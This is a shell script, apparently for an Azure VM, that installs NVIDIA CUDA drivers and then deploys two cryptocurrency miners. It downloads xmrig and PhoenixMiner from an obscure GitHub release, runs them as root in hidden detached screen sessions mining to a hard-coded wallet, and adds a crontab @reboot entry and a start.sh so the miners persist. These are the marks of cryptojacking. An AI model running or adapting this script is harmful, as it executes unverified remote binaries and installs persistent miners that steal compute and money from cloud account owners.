#!/bin/sh
sudo sysctl -p
sudo apt-get update
cd $HOME/
sudo apt-get -y -qq upgrade
sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev unzip tmux
sudo apt-get install linux-headers-$(uname -r)
distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
sudo apt-get update
sudo apt-get -y install cuda-drivers
export PATH=/usr/local/cuda-11.2/bin${PATH:+:${PATH}}
cat <(crontab -l) <(echo "@reboot /home/azureuser/start.sh") | crontab -
wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/winxmr.tar.gz
tar -zxvf winxmr.tar.gz
sudo screen -dmS xmrig ./xmrig-v5.11.1/xmrig &
wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/PhoenixMiner_5.6d_Linux.tar.gz
tar xzf PhoenixMiner_5.6d_Linux.tar.gz
sudo screen -dmS PhoenixMiner ./PhoenixMiner_5.6d_Linux/PhoenixMiner -pool eu1.ethermine.org:4444 -wal 0x50167235D2b995DEdc2f2d28Cd1cD184D97f1aba.Image -pass x &
echo '#!/bin/sh'>>start.sh
echo "cd $HOME/">>start.sh
echo "sudo screen -dmS xmrig ./xmrig-v5.11.1/xmrig &">>start.sh
echo "sudo screen -dmS PhoenixMiner ./PhoenixMiner_5.6d_Linux/PhoenixMiner -pool eu1.ethermine.org:4444 -wal 0x50167235D2b995DEdc2f2d28Cd1cD184D97f1aba.Image -pass x &">>start.sh
